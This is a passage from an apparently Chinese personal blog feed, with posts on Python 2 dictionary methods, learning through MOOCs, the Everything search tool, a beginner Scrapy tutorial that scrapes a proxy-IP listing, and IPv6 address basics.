基本字典操作自动添加d[key]=values将值values关联到键key上。即使键起初在字典中并不存在，也可以为其赋值，会建立新的项。 访问字典中的值d[key]返回关联到键key上的值。 判断成员资格直接使用key访问：key不存在会报错，可以使用had_key()或者in和not in判断。 len操作len(dict)返回dict中键值对的数量。 123&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; len(d)3 del操作del d[key]删除字典d中键值为key的元素，也可以使用del删除整个字典。 123456789&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; del d[&apos;class&apos;]&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;&#125;&gt;&gt;&gt; del d&gt;&gt;&gt; dTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &apos;d&apos; is not defined 遍历字典方法一： 1234567&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;, &apos;age&apos;:&apos;22&apos;, &apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; for key in d:... print key,d[key]...age 22name fzyclass 13-3 方法二： 1234567&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;, &apos;age&apos;:&apos;22&apos;, &apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; for key,value in d.items():... print key,value...age 22name fzyclass 13-3 字典方法clearclear()方法清除字典中所有的项。 1234&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.clear()&gt;&gt;&gt; d&#123;&#125; copycopy()方法返回一个具有相同键值对的新字典。在复制的时候，使用的是浅拷贝，复制了对象，但是对象中的元素，依然使用引用。 浅拷贝与深拷贝 浅拷贝：没有拷贝子对象，所以原始数据改变，子对象会改变 深拷贝：包含对象里面的自对象的拷贝，所以原始对象的改变不会造成深拷贝里任何子元素的改变 12345678&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;course&apos;:[&apos;python&apos;,&apos;java&apos;,&apos;c++&apos;]&#125;&gt;&gt;&gt; c = d.copy()&gt;&gt;&gt; c[&apos;name&apos;] = &apos;xxx&apos;&gt;&gt;&gt; c[&apos;course&apos;].remove(&apos;c++&apos;)&gt;&gt;&gt; c&#123;&apos;course&apos;: [&apos;python&apos;, &apos;java&apos;], &apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;xxx&apos;&#125;&gt;&gt;&gt; d&#123;&apos;course&apos;: [&apos;python&apos;, &apos;java&apos;], &apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;&#125; 当副本中替换值时，原字典不受影响，但是，如果修改了某个值，原字典也会改变。 避免这个问题的一种方法就是使用深复制，复制其包含的所有值。（可以使用copy模块的deepcopy函数来实现） items和iteritemsitems()方法将字典所有的项以列表方式返回。列表的每一项都表示为键值对的形式，但是项再返回时没有特定的次序。 123&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.items()[(&apos;age&apos;, &apos;22&apos;), (&apos;name&apos;, &apos;fzy&apos;), (&apos;class&apos;, &apos;13-3&apos;)] iteritems()方法与items()方法类似，但是会返回一个迭代器对象而不是列表。 12345&gt;&gt;&gt; it = d.iteritems()&gt;&gt;&gt; it&lt;dictionary-itemiterator object at 0x02AFF750&gt;&gt;&gt;&gt; list(it) #把迭代对象转换成列表[(&apos;age&apos;, &apos;22&apos;), (&apos;name&apos;, &apos;fzy&apos;), (&apos;class&apos;, &apos;13-3&apos;)] keys和iterkeyskeys()方法返回字典中键的列表，而iterkeys()方法返回字典中键的迭代器。 12345678&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.keys()[&apos;age&apos;, &apos;name&apos;, &apos;class&apos;]&gt;&gt;&gt; it = d.iterkeys()&gt;&gt;&gt; it&lt;dictionary-keyiterator object at 0x02AFFB40&gt;&gt;&gt;&gt; list(it) #把迭代对象转换成列表[&apos;age&apos;, &apos;name&apos;, &apos;class&apos;] values和itervaluesvalues()方法返回字典中所有值的列表，而itervalues()方法返回值的迭代器。 12345678&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.values()[&apos;22&apos;, &apos;fzy&apos;, &apos;13-3&apos;]&gt;&gt;&gt; it = d.itervalues()&gt;&gt;&gt; it&lt;dictionary-valueiterator object at 0x02AFF8A0&gt;&gt;&gt;&gt; list(it) #把迭代对象转换成列表[&apos;22&apos;, &apos;fzy&apos;, &apos;13-3&apos;] has_keyhas_key(key)判断字典中是否存在key，Python3.0中不包括这个函数，建议使用 in 和 not in 代替。 123456&gt;&gt;&gt; d = &#123; &#125;&gt;&gt;&gt; d.has_key(&apos;name&apos;)False&gt;&gt;&gt; d[&apos;name&apos;] = &apos;fzy&apos;&gt;&gt;&gt; d.has_key(&apos;name&apos;)True fromkeysfromkeys(seq,val=None)方法以seq中的元素为键创建并返回一个字典，val为指定的默认值。 12&gt;&gt;&gt; &#123;&#125;.fromkeys((&apos;x&apos;,&apos;y&apos;),-1)&#123;&apos;y&apos;: -1, &apos;x&apos;: -1&#125; getget(key,default=None)方法是个更宽松的访问字典项的方法，访问字典中不存在的项时不会出错。键存在时，get方法返回键对应的值，如果该键不存在，则返回default指定的值，不指定default参数时默认返回None。 1234567&gt;&gt;&gt; d = &#123; &#125;&gt;&gt;&gt; print d[&apos;name&apos;]Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;KeyError: &apos;name&apos;&gt;&gt;&gt; print d.get(&apos;name&apos;)None pop和popitempop(key，default)方法用来获得对应于给定键的值，然后将这个键值对从字典中移除。 12345&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.pop(&apos;age&apos;)&apos;22&apos;&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; popitem()类似于list.pop，但是list.pop弹出列表的最后一个元素，popitem弹出随机的项，因为字典是无序的，并没有“最后的元素”或者其他有关顺序的概念。 12345&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.popitem()(&apos;age&apos;, &apos;22&apos;)&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; updateupdate()方法可以利用一个字典项更新另一个字典。 12345&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; x = &#123;&apos;age&apos;:&apos;18&apos;,&apos;school&apos;:&apos;hunau&apos;&#125;&gt;&gt;&gt; d.update(x)&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;18&apos;, &apos;school&apos;: &apos;hunau&apos;, &apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; 提供的字典中的项会被添加到旧的字典中，若有相同的键则会进行覆盖。 setdefaultsetdefault(key,default=None)方法能够获得与给定值相关联的值，并且在字典中不含有给定键的情况下设定相应的键值。 123456789&gt;&gt;&gt; d = &#123; &#125;&gt;&gt;&gt; d.setdefault(&apos;name&apos;,&apos;fzy&apos;)&apos;fzy&apos;&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;&#125;&gt;&gt;&gt; d.setdefault(&apos;name&apos;,&apos;111&apos;)&apos;fzy&apos;&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;&#125; 由上可知，当键不存在的时候，setdefault返回默认值并且相应地更新字典。如果键存在，那么就返回与其对应的值，但是不改变字典。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习慕课这两年]]></title>
    <url>%2F2017%2F01%2F12%2F%E5%AD%A6%E4%B9%A0%E6%85%95%E8%AF%BE%E8%BF%99%E4%B8%A4%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[算起来，我学习慕课已经有两年多的时间了，从一开始接触的网易公开课，到后来的中国大学MOOC，以及慕课网、极客学院等IT教育类网站，再到近期了解到的学堂在线、Coursera、以及综合MOOC搜索网站：MOOC学院等，这期间，收获很大，感悟也很多。 这是最好的时代也是最坏的时代。 越来越多的大学开始投入大量的资金制作慕课，也有越来越多的公司开始搞在线教育的业务，开发了很多在线的课程，我们开始享受到越来越丰富的教育资源，一方面，即使你只是在一所普通的大学，只要你想学，网络已经给我们提供了很多的资源，这在一定程度上，缓解了教育资源分布不均的问题。另一方面，丰富的慕课课程给大家终身学习提供了有利的保障，即使你已经毕业，或者已经步入社会，你同样可以像在学校那样接受教育，来再次提升自己各方面的能力。 但是，同样的问题又来了。就像吴军博士在智能时代中说的那样：虽然这是一个非常有希望的时代，这是一个最好的时代，也是一个最坏的时代。因为好坏看你站在哪个角度，你是否参与了，你参与进来，对你来说就是一个最好的时代。如果你拒绝这件事情，可能对你来说未来就是一个很坏的时代。 对于慕课时代，如果你充分利用起这些慕课资源在不断地学习，那么你是参与进来了，对于你来说这是个最好的时代，但是如果你拒绝了这件事情，别人在努力提升自己，而你不愿意参与，差距就会慢慢拉开，对你来说就会是一种威胁，这就是一个最坏的时代。虽然，这样看起来总是在竞争，会感觉很累，但是这样社会才会进步。 对于我个人来说，这两年累计达上千个小时的学习对我来说有着非常重要的意义，一方面，我通过慕课网站学习了一些国内外一流大学的课程，接受到了更好的教育，使我对一些课程理解更加深刻，另一方面，也是更重要的一点，我们的大学大多是通识教育，不会教太多技术性的东西，但是IT技术类的慕课弥补了这个缺陷，通过这些课程的学习，我掌握了很多软件开发技能，这对于今后的发展也是至关重要的。 学习慕课这两年，渐渐明白：教育是一辈子的事情，笑到最后的是一辈子接受教育的人，一定要树立终生学习的观念。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[推荐-效率搜索工具：Everything]]></title>
    <url>%2F2017%2F01%2F05%2F%E6%8E%A8%E8%8D%90-%E6%95%88%E7%8E%87%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%EF%BC%9AEverything%2F</url>
    <content type="text"><![CDATA[还在为找不到磁盘中的文件而困扰吗？还在为Windows自带文件检索工具速度太慢而苦恼吗？不用担心，Everything帮你来搞定。 Everything，一个非常小巧的文件搜索软件，它只有几百KB，但作为一个快速检索的工具，它麻雀虽小五脏俱全，最重要的是它比系统自带的搜索快很多，非常实用。 Everything简介Everything是一款集性能与速度于一身的搜索工具，它是基于NTFS文件系统的特定来实现快速检索的。它也需要建索引，但是索引文件非常小，100多G的硬盘大约也就几M到十几M的索引文件，而且建立速度非常快，大约几秒钟就建立完成了。搜索速度呢，快到你不可想象，一般不会超过2秒钟！！更强大的是，它支持正则表达式搜索。 它不仅可以检索单个关键词，还能同时空格多个关键词来检索，特殊字符，文件后缀，也没问题，还能按文件名、修改时间等对检索结果排序。绝对是你在日积月累的电脑文件中翻照片、找文档的利器。 官网地址：http://www.voidtools.com/ 下载方式官网下载安装（推荐）一般下载软件最好是到官方网站去下载，这样下载下来的一定是纯净版，这样可以避免很多不必要的麻烦。 下载地址：http://www.voidtools.com/downloads/ 根据电脑系统的位数以及自己的需要下载相应的版本，然后双击下载的exe文件进行安装。 360软件管家下载安装如果你的电脑安装了360，那么你可以打开360软件管家搜索Everything，然后点击安装即可，方便快捷。 百度搜索寻找资源（不推荐）大家也可以到百度搜索Everything，马上可以找到这个软件的很多下载资源，但是并不推荐这么做，首先，很多软件下载网站都有很多广告，一不小心点错就下载了另一个软件，另外，还有一些网站提供的软件会有捆绑安装其他软件，所以比较麻烦。 你可能会问Everything为什么这么快？Everything是一个运行于Windows系统，基于文件、文件夹名称的快速搜索引擎。 Everything在搜索之前就会把所用的文件和文件夹都列出来，这一点与Windows自带的搜索系统不一样，所以我们称之为Everything。 在搜索框输入文字，它就会只显示过滤后的文件和目录。 Everything搜索文件内容吗？不，Everything不搜索文件内容，只搜索文件和文件夹名称。 Everything是不是非常占用系统资源？不，Everything使用非常少的系统资源。一个刚安装完的Windows XP SP2系统(约20,000份文件)需要占用3-5 mb内存和不到1 mb的硬盘空间。一百万份文件大概需要45 mb内存和5 mb硬盘空间。 如何搜索文件或文件夹？在搜索编辑中键入部分文件或文件夹名称，结果会立即显示。 如何搜索文件类型？要搜索的文件类型，输入文件扩展名搜索编辑，即搜索MP3文件类型，键入 .MP3到搜索编辑。要搜索多种类型的文件类型，请使用| 到单独的文件类型，如 .BMP | * .JPG将搜索扩展名为BMP或JPG文件。 如何在特定位置搜索文件和文件夹？要搜索特定位置中的文件和文件夹，请在搜索字符串中包含\。 如何使用布尔运算符？AND是默认的布尔运算符。例如，下面是如何搜索ABC和123：ABC 123 要搜索以下两种搜索词，添加| 之间的术语。例如，下面是如何搜索.jpg或.BMP：.JPG | .BMP 要排除的东西从搜索中包括！在术语的前面。例如，下面是如何搜索，除了ABC一切：！ABC 如何使用正则表达式？正则表达式，又称规则表达式，它是计算机科学的一个概念。正则表通常被用来检索、替换那些符合某个模式(规则)的文本。 点击Everything菜单栏中的帮助，选择正则表达式语法选项即可看到如下界面，使用正在表达式进行搜索。 使用示例： 搜索G:\Python学习路径下的所有py格式的文件，这里使用*.py来使其匹配所有py格式的文件。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>软件</tag>
        <tag>工具</tag>
        <tag>Everything</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫框架：Scrapy]]></title>
    <url>%2F2016%2F12%2F26%2FPython%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%EF%BC%9AScrapy%2F</url>
    <content type="text"><![CDATA[Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架。它使用 Twisted这个异步网络库来处理网络通讯，架构清晰，并且包含了各种中间件接口，可以灵活的完成各种需求。学习Python爬虫有一段时间了，但是也是最近才接触到如此强大的Scrapy，它比BeautifulSoup更加完善，BeautifulSoup可以说是轮子，而Scrapy则是车子，不需要你关注太多的细节。 需要注意的是：Scrapy仅仅支持Python 2.7。 安装Scrapy1pip install Scrapy pip 是一个Python包管理工具，主要是用于安装 PyPI 上的软件包，可以替代 easy_install 工具。没有安装过的建议安装一下，经常用到，具体安装教程请自行百度。 创建项目Windows下，打开命令提示符窗口，进入到打算存储代码的目录中，使用下面的命令创建一个scrapy项目。 1scrapy startproject 项目名 项目结构文件管理器打开该目录可以看到多了scrapy项目的文件夹，进入文件夹可以看到如下这些文件： scrapy.cfg: 项目的配置文件 项目名/: 该项目的python模块。之后我们将在此加入代码。 项目名/items.py: 项目中的item文件. 项目名/pipelines.py: 项目中的pipelines文件. 项目名/settings.py: 项目的设置文件. 项目名/spiders/: 放置spider代码的目录. 定义要抓取的数据：Item爬取的主要目标就是从非结构性的数据源提取结构性数据，例如网页。 Scrapy提供 Item 类来满足这样的需求。 Item 是保存爬取到的数据的容器；其使用方法和python字典类似， 并且提供了额外保护机制来避免拼写错误导致的未定义字段错误。 Item 对象是种简单的容器，保存了爬取到得数据。 其提供了 类似于词典(dictionary-like) 的API以及用于声明可用字段的简单语法。 默认生成的items.py文件如下： 12345678910111213# -*- coding: utf-8 -*-# Define here the models for your scraped items## See documentation in:# http://doc.scrapy.org/en/latest/topics/items.htmlimport scrapyclass IpspiderItem(scrapy.Item): # define the fields for your item here like: # name = scrapy.Field() pass 我们可以scrapy.Field()定义一些字段，例如name、sex等。 编写提取item数据的SpiderSpider是用户编写用于从单个网站(或者一些网站)爬取数据的类。其包含了一个用于下载的初始URL，如何跟进网页中的链接以及如何分析页面中的内容， 提取生成 item 的方法。 为了创建一个Spider，您必须继承 scrapy.Spider 类，且定义以下三个属性: name: 用于区别Spider。 该名字必须是唯一的，您不可以为不同的Spider设定相同的名字。 start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。 parse() 是spider的一个方法。 被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。 123456789101112/spiders/__init__.py的大致框架如下：import scrapyclass DmozSpider(scrapy.Spider): name = &quot;这里定义爬虫的名字&quot; start_urls = [ 这里填写起始的网址 ] def parse(self, response): 这里处理请求得到的数据，以及跳转到下一页 Selectors选择器Scrapy提取数据有自己的一套机制。它们被称作选择器(seletors)，因为他们通过特定的 XPath 或者 CSS 表达式来“选择” HTML文件中的某个部分。 Selector有四个基本的方法: xpath(): 传入xpath表达式，返回该表达式所对应的所有节点的selector list列表 。 css(): 传入CSS表达式，返回该表达式所对应的所有节点的selector list列表. extract(): 序列化该节点为unicode字符串并返回list。 re(): 根据传入的正则表达式对数据进行提取，返回unicode字符串list列表。 XPath 是一门用来在XML文件中选择节点的语言，也可以用在HTML上。 CSS 是一门将HTML文档样式化的语言。选择器由它定义，并与特定的HTML元素的样式相关连。 我们可以使用浏览器的开发者工具来得到我们所需节点的xpath表达式，然后通过xpath()方法来得到其内容，如下： 1response.xpath(&apos;xpath表达式&apos;) 假设，spider抓取到的html文档如下： 123456789101112131415&lt;html&gt; &lt;head&gt; &lt;base href=&apos;http://example.com/&apos; /&gt; &lt;title&gt;Example website&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&apos;images&apos;&gt; &lt;a href=&apos;image1.html&apos;&gt;Name: My image 1 &lt;br /&gt;&lt;img src=&apos;image1_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image2.html&apos;&gt;Name: My image 2 &lt;br /&gt;&lt;img src=&apos;image2_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image3.html&apos;&gt;Name: My image 3 &lt;br /&gt;&lt;img src=&apos;image3_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image4.html&apos;&gt;Name: My image 4 &lt;br /&gt;&lt;img src=&apos;image4_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image5.html&apos;&gt;Name: My image 5 &lt;br /&gt;&lt;img src=&apos;image5_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 例如，要得到title标签内的内容，xpath表达式应该写成： 1//title/text() 为了提取真实的原文数据，你需要调用 .extract() 方法如下: 123response.xpath(&apos;//title/text()&apos;).extract()结果如下：[u&apos;Example website&apos;] 如你所见， .xpath()方法返回一个类 SelectorList 的实例, 它是一个新选择器的列表。这个API可以用来快速的提取嵌套数据。 再比如，要得到a标签中的链接，应该这样做： 123for sel in response.xpath(&apos;//div/a&apos;).extract(): #得到含有所有a标签的列表，遍历列表依次取出其中的链接 url = sel.xpath(&apos;/@href&apos;) #使用@得到属性值 print url 关于xpath的语法这里只是举了两个简单的例子，详细的语法可以参考网上其他教程。 示例程序我们通过编写一个爬取有代理：12月21号 国内代理ip服务器列表的爬虫来练习scrapy的基本使用。 地址如下：http://www.youdaili.net/Daili/guonei/25083.html 新建项目1scrapy startproject IpSpider 分析页面打开浏览器的开发者工具，快捷键f12，笔记本可能需要fn键+f12. （1）定位数据 点击控制台左上角的图标，然后鼠标箭头移动到代理ip列表的一条记录，通过分析我们可以知道所有的记录都是存放在一个p标签下的span标签里面，所以我们可以先找到所有的p标签，然后得到p标签下span标签的内容即为我们所需要的代理ip和地址数据。 那么，如何得到所有的p标签呢？ 鼠标选中列表中第一个ip地址，右键copy，然后copy xpath，得到如下： /html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1] 第二个ip地址的xpath为： /html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1] 依次类推： 使用response.xpath(‘/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p’)即可得到所有的p标签，即列表的所有项。 如何得到p标签下span标签的内容呢？ 我们copy一下p标签下任意一个span标签得到xpath为：/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1]/span 上一步中我们得到了一个包含所有p标签的列表，然后我们遍历这个列表，依次取出每个p标签中span的内容，如下： 12for sel in response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p&apos;): sel.xpath(&apos;span/text()&apos;) 这样我们就可以分别得到每一个列表项，即每一条代理ip地址信息。 （2）分析数据格式 由上图可知，代理ip列表的每一项有一条ip信息，我们要获取的ip信息位于字符串的@符号之前，地址信息位于#符号与空格之间，这是我们处理数据的关键所在。 （3）跳转到下一页继续爬取 在第一页时： 在第最后一页时： 每次需要得到下一页按钮的链接，到最后一页时，下一页按钮的链接会变成#号，因此我们只要判断得到的链接不是#号就代表还有下一页，每次得到下一页的链接我们就把它传入Request函数，并yield这个Request让爬虫继续发送请求，爬取下一个页面。 123456pagenum = &apos;&apos;.join(response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[4]/li[8]/a/@href&apos;).extract()) print pagenum if pagenum != &apos;#&apos;: nexturl = &apos;http://www.youdaili.net/Daili/guonei/&apos; + pagenum print nexturl yield Request(nexturl, callback=self.parse) #爬取下一页 编写代码12345678910111213141516171819202122232425262728IpSpider/spiders/__init__.py的代码如下：# -*- coding: utf-8 -*-import scrapyfrom IpSpider.items import IpspiderItemfrom scrapy.http import Request class IpSpider(scrapy.Spider): name = &quot;ip&quot; start_urls = [&quot;http://www.youdaili.net/Daili/guonei/25083.html&quot;] def parse(self, response): for sel in response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p&apos;): item = IpspiderItem() s = &apos;&apos;.join(sel.xpath(&apos;span/text()&apos;).extract()) item[&apos;ip&apos;] = s[0:s.rfind(&apos;@&apos;,1)] #切分字符串，只取ip item[&apos;address&apos;] = s[s.rfind(&apos;#&apos;,1)+1:s.rfind(&apos; &apos;,1)] #切分字符串，取出#号和空格之间的地址 yield item #处理下一页 pagenum = &apos;&apos;.join(response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[4]/li[8]/a/@href&apos;).extract()) print pagenum if pagenum != &apos;#&apos;: nexturl = &apos;http://www.youdaili.net/Daili/guonei/&apos; + pagenum print nexturl yield Request(nexturl, callback=self.parse) #爬取下一页 123456789IpSpider/items.py的代码如下：import scrapyclass IpspiderItem(scrapy.Item): # define the fields for your item here like: ip = scrapy.Field() #ip字段 address = scrapy.Field() #地址字段 pass pipelines.py和settings.py我们暂时不需处理，待下次深入学习scrapy再来修改。 开始爬取进入项目的根目录，执行crawl命令启动spider: 只执行程序，不保存数据： 1scrapy crawl ip 执行程序，并输出保存数据： 1scrapy crawl ip -o ip.json 该命令将采用 JSON 格式对爬取的数据进行序列化，生成 ip.json 文件。 也可以采用 CSV 格式对爬取的数据进行序列化： 1scrapy crawl ip -o ip.csv 将生成 ip.csv 文件。 效果如下：]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPv6学习笔记(一)]]></title>
    <url>%2F2016%2F12%2F19%2FIPv6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[IPv6是Internet Protocol Version 6的缩写，IPv6是IETF（互联网工程任务组，Internet Engineering Task Force）设计的用于替代现行版本IP协议（IPv4）的下一代IP协议，号称可以为全世界的每一粒沙子编上一个网址。 此篇博客主要学习IPv6的特点、IPv6数据报格式、IPv6地址格式与分类。 IPv6与IPv4比较IPv4的局限性 IP地址枯竭 报头过于复杂,使网络节点处理效率不高 NAT技术破坏了端到端应用模型，不安全 地址配置与使用不够简便 IPv4协议本身的安全性不足 QoS功能难以满足显示要求 IPv6的技术优势 超大的地址空间，地址增加了2^96倍 自动配置用户地址，提供即插即用功能，路由器可以简单路过选项而不做任何处理，加快了处理速度 全球重新部署，有规划，易于实现聚合 报头简单，加快报文转发，提高了吞吐量，能通过扩展报头技术可实现新技术 IPv6支持永远在线，为人们提供更友好的服务 内置的安全机制，如IPSec 增强了对移动IP的支持 IPv4与IPv6对比表 比较内容 IPv6 IPv4 地址空间 2的128次方，足够大 2的32次方，约42亿 表示方法 冒号十六进制 点分十进制 安全性 采用标准的方法，以支持全球范围的内部网接入和虚拟专用网 几个可选方法，每个可选方法都有由有限的地址空间引起的扩展性问题 移动IP网络配置 规模可支持全球移动终端IPv6标准的一个完整的组成部分 可支持有限数量的终端，无综合的标准化解决方案 IPv6数据报 IPv6数据报基本结构（1）Ipv6报头 Ipv6报头由40个字节的固定长度组成，相比Ipv4报头，删去了报头长度、标示、标志、检验和等字段。 （2）扩展报头 在IPv6中用扩展报头来代替Ipv4中的部分选项字段。新的扩展报头格式增强了IPv6的功能，使其具有极大的扩展性。 （3）上层协议数据单元 由上层协议报头和有效载荷构成。有效载荷可以是ICMPv6报文、TCP报文、UDP报头等。 IPv6数据报的报头格式 版本号(version) 不同的IP协议版本使用不同的数据报格式。 通信量等级(Traffic Classes) 使得源节点和路由器能够识别IPv6信息包的优先级。与IPv4服务类型TOS字段含义类似。 流标签(Flow Label) 标记那些需要IPv6路由器特殊处理(如一种非默认服务质量或实时服务)的信息包顺序。 有效负载长度(Payload Length) 定长40字节数据报首部后面的字节数量，包括扩展报头和负载数据，即数据报长度-40。 下一个首部(Next Header) 当IPv6没有扩展报头时，该字段的作用和IPv4的上层协议字段一样。当含有扩展报头时，该字段的值即为第一个扩展报头的类型。 跳限制(Hop Limit) 转发数据报的每台路由器对该字段的值减1，若减为0则丢弃该数据报。 128位源IP地址(Source Address) 128位目的IP地址(Destnation Address) IPv6地址格式 IPv6二进位制下为128位元长度 以16位元为一组，每组以冒号”:”隔开 可以分为8组，每组以4位元十六进制方式表示 首选格式IPv6地址表示为冒号分十六进制格式 例如： 21DA:00D3:0000:0000:02AA:00FF:FE22:9C5A 压缩表示压缩规则1：每项数字前导的0可以省略，省略后前导数字仍是0则继续。例如，以下IP地址都是等价的： 123452001:0DB8:02de:0000:0000:0000:0000:0e132001:DB8:2de:0000:0000:0000:0000:e132001:DB8:2de:000:000:000:000:e132001:DB8:2de:00:00:00:00:e132001:DB8:2de:0:0:0:0:e13 压缩规则2：可以用双冒号”::”表示一组0或多组连续的0 122001:DB8:2de:0:0:0:0:e132001:DB8:2de::e13 不过一个IPv6地址只允许使用一次“::”，请注意有的情形下省略是非法的. 12001::25de::cade 因为它有可能是下种情形之一，造成无法推断。12342001:0000:0000:0000:0000:25de:0000:cade2001:0000:0000:0000:25de:0000:0000:cade2001:0000:0000:25de:0000:0000:0000:cade2001:0000:25de:0000:0000:0000:0000:cade 内嵌IPv4地址的IPv6地址表示IPv4兼容IPv6地址 例如：::192.168.1.2 IPv4映射IPv6地址 例如：::FFFF:192.168.1.2 地址前缀IPv6地址的地址前缀同IPv4中的CIDR一样，依然使用“地址/前缀长度”表示，例如：2001:da8:0:2::/64 所有无状态自动配置的地址的前缀都是fe80，其后64位是由48位的MAC地址生成的. IPv6地址类型 单播地址只能分配给一个节点上的一个接口，即寻址到该单播地址的数据报文最终会被发送到一个唯一的接口。 组播（多播）地址所谓组播，是指一个源节点发送的单个数据报文能被特定的多个目的节点接收到，路由器转发组播数据是根据组播路由协议学习到得拓扑结构进行的，适合于One-to-Many的通信场合。在IPv6网络中，组播地址也由特定的前缀FF::/8来表示。 任播（泛播）地址这是IPv6特有的地址类型，用来标示一组网络接口（通常属于不同的节点）。但与组播地址不同，路由器会将目的地址作为任播地址的数据报文，发给距本路由器最近的一个网络接口。适用于One-to-One-of-Many的通信场合。 有特殊含义的地址（1）未指定位址 ::/128：所有位元皆为零的位址称作未指定位址。这个位址不可指定给某个网路介面，并且只有在主机尚未知道其来源IP时，才会用于软体中。路由器不可转送包含未指定位址的封包。 （2）Link local位址 ::1/128：是一种单播绕回位址。如果一个应用程式将封包送到此位址，IPv6堆叠会转送这些封包绕回到同样的虚拟介面（相当于IPv4中的127.0.0.1）。fe80::/10－ 这些link-local位址指明，这些位址只在区域连线中是合法的，这有点类似于IPv4中的169.254.0.0/16。 （3）Solicited-node多播位址 ff02::1:FFXX:XXXX－XX:XXXX：为相对应的单播或任播位址中的三个最低的位元组 （4）唯一区域位域 fc00::/7：唯一区域位址（ULA，unique local address）只可在一群网站中发送。这定义在RFC 4193中，是用来取代site-local位域。这位址包含一个40位元的伪随机数，以减少当网站合并或封包误传到网路时碰撞的风险。这些位址除了只能用于区域外，还具备全域性的范畴，这点违反了唯一区域位域所取代的site-local位址的定义。 （5）多播位址 ff00::/8：这个前置表明定义在”IP Version 6 Addressing Architecture”（RFC 